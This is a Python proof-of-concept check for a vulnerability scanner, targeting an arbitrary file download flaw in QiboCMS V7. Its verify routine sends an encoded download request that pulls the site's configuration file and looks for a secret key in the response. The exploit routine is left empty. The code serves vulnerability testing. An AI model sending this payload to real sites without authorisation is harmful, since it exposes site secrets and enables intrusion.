# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'QiboCMS_0010' # 平台漏洞编号，留空
    name = 'QiboCMS V7 任意文件下载' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2013-02-03'  # 漏洞公布时间
    desc = '''
        QiboCMS V7 /do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8 任意文件下载漏洞。
    ''' # 漏洞描述
    ref = '' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'QiboCMS(齐博CMS)'  # 漏洞应用名称
    product_version = 'V7'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '28560e24-bf36-4b4f-808d-893d70a01ce2'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8'
            target = arg + payload
            code, head, res, errcode, _ = hh.http(target)
            if code == 200 and "webdb\['mymd5'\]" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()